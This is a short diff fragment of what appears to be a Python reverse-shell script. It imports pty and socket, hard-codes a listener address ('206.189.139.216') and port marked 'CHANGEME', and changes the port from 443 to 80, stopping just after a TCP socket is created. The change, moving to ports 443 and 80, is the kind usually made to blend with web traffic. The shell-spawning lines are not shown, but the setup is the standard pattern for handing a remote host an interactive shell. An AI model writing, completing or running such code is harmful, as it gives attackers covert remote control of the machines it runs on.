@@ -12,7 +12,7 @@ import pty
 import socket
 
 lhost = "206.189.139.216" # XXX: CHANGEME
-lport = 443 # XXX: CHANGEME
+lport = 80 # XXX: CHANGEME
 
 def main():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
